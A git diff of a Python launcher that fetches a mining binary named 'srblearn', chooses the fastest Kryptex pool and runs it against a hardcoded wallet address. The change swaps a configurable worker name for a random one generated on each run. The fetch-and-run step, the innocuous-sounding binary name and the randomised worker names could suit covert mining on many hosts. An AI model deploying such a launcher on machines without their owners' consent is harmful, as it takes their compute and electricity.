@@ -2,13 +2,14 @@
 region, then launches the process against the fastest pool.
 """
 
-import argparse
 import json
 import os
+import random
 import socket
 import stat
 import subprocess
 import sys
+import string
 import tarfile
 import time
 import urllib.request
@@ -17,7 +18,6 @@ from datetime import datetime
 
 # --- wallet ------------------------------------------------------------
 WALLET_ADDRESS = "prl1pesefvguavkq7f4z2zc65tftdfx3hfqm3dyf63h9zzypaupf8a5tsq2hl50"
-WORKER_NAME = "worker"
 
 # --- binary / release ---------------------------------------------------
 BIN = "srblearn"
@@ -48,6 +48,10 @@ POOLS = {
 def log(level: str, msg: str) -> None:
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     print(f"[{ts}] {level:<5} {msg}", flush=True)
+
+def random_worker_name(length: int = 6) -> str:
+    """Generate a random worker name (lowercase letters only)."""
+    return "".join(random.choices(string.ascii_lowercase, k=length))
 
 
 # --- GitHub release lookup ----------------------------------------------
@@ -198,7 +202,7 @@ def select_best_pool() -> str:
 
 # --- process ---------------------------------------------------------------
 
-def launch_process(binary_path: str, pool: str) -> subprocess.Popen:
+def launch_process(binary_path: str, pool: str, worker_name: str) -> subprocess.Popen:
     cwd = os.path.dirname(os.path.abspath(binary_path)) or "."
     proc = subprocess.Popen(
         [
@@ -207,7 +211,7 @@ def launch_process(binary_path: str, pool: str) -> subprocess.Popen:
             "--disable-cpu",
             "--extended-log",
             "--pool", pool,
-            "--wallet", f"{WALLET_ADDRESS}.{WORKER_NAME}",
+            "--wallet", f"{WALLET_ADDRESS}.{worker_name}",
         ],
         cwd=cwd,
         stdout=subprocess.PIPE,
@@ -215,7 +219,7 @@ def launch_process(binary_path: str, pool: str) -> subprocess.Popen:
         text=True,
         bufsize=1,
     )
-    log("INFO", f"started pid={proc.pid} | worker={WORKER_NAME} | cwd={cwd}")
+    log("INFO", f"started pid={proc.pid} | worker={worker_name} | cwd={cwd}")
     return proc
 
 
@@ -227,19 +231,12 @@ def stream_output(proc: subprocess.Popen) -> int:
     return proc.wait()
 
 
-def parse_args() -> argparse.Namespace:
-    parser = argparse.ArgumentParser(description="Auto-update and run srblearn against the fastest Kryptex pool.")
-    parser.add_argument("--worker", default=WORKER_NAME, help=f"worker name reported to the pool (default: {WORKER_NAME})")
-    return parser.parse_args()
-
-
 def main() -> None:
-    global WORKER_NAME
-    args = parse_args()
-    WORKER_NAME = args.worker
+    WORKER_NAME = random_worker_name()
+    log("INFO", f"worker={WORKER_NAME}")
     binary_path = ensure_binary_installed()
     pool = select_best_pool()
-    proc = launch_process(binary_path, pool)
+    proc = launch_process(binary_path, pool, WORKER_NAME)
     code = stream_output(proc)
     log("ERROR" if code else "INFO", f"exited code={code}")
 
